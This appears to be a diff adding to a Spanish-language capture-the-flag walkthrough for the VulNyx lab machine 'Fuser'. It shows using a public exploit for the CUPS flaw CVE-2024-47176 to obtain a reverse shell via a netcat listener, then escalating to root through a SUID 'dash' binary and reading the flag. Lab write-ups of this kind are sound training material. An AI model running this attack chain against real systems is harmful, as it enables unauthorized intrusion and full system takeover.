@@ -76,3 +76,88 @@ Fuser es una máquina de la plataforma VulNyx con un nivel de dificultad **Low**
 - Ejecutar el exploit:
   ```bash
   python3 exploit.py 10.
+
+
+#### **Creación de una impresora maliciosa**
+- El exploit de ippsec automatiza la creación de una impresora maliciosa en el servicio CUPS. Al ejecutar el exploit, se crea una impresora llamada **HACKED_10_0_2_4**.
+  ```bash
+  python3 exploit.py 10.0.2.5
+  ```
+
+#### **Activación del exploit**
+- Acceder al panel de CUPS desde el navegador:
+  ```
+  http://10.0.2.5:631
+  ```
+- Navegar a la sección de impresoras y seleccionar la impresora **HACKED_10_0_2_4**.
+- Hacer clic en **"Imprimir página de prueba"** para activar el exploit.
+
+#### **Obtención de la shell inversa**
+- Al hacer clic en "Imprimir página de prueba", el código malicioso se ejecuta y se abre una **shell inversa** en la máquina atacante.
+- Verificar la conexión en la máquina atacante:
+  ```bash
+  nc -nlvp 4444
+  ```
+  Se obtiene una shell en la máquina víctima.
+
+---
+
+### **5. Tratamiento de la TTY**
+- Una vez dentro de la máquina víctima, es recomendable mejorar la shell para hacerla más interactiva:
+  ```bash
+  python3 -c 'import pty; pty.spawn("/bin/bash")'
+  ```
+  Esto permite usar comandos como `clear`, `su`, y autocompletar con `Tab`.
+
+---
+
+### **6. Escalada de privilegios**
+
+#### **Búsqueda de binarios SUID**
+- Buscar binarios con el bit SUID activado:
+  ```bash
+  find / -perm -4000 2>/dev/null
+  ```
+  Se identifica que el binario **`dash`** tiene el bit SUID activado.
+
+#### **Explotación del binario SUID**
+- El binario `dash` con el bit SUID permite escalar privilegios ejecutándolo con la opción `-p`:
+  ```bash
+  /usr/bin/dash -p
+  ```
+  Esto otorga una shell con privilegios de **root**.
+
+---
+
+### **7. Obtención de la flag**
+- Una vez como root, buscar la flag en el directorio `/root`:
+  ```bash
+  cd /root
+  cat root.txt
+  ```
+
+---
+
+## Resumen
+Para resolver la máquina Fuser:
+1. Se realizó un escaneo de puertos, identificando los servicios SSH, HTTP y CUPS.
+2. Se explotó una vulnerabilidad en CUPS (CVE-2024-47176) utilizando un exploit automatizado de ippsec, lo que permitió obtener una shell inversa.
+3. Se escalaron privilegios aprovechando un binario SUID (`dash`).
+4. Finalmente, se localizó la flag en el directorio `/root`.
+
+Este laboratorio demuestra cómo una configuración insegura en servicios como CUPS y binarios SUID puede permitir el control total de un sistema.
+
+---
+
+## Herramientas utilizadas
+- **Nmap**: Para escaneo de puertos y detección de servicios.
+- **Searchsploit**: Para buscar vulnerabilidades conocidas.
+- **Exploit de ippsec**: Para explotar la vulnerabilidad en CUPS.
+- **Dash**: Para escalada de privilegios mediante binario SUID.
+
+---
+
+
+
+
+  
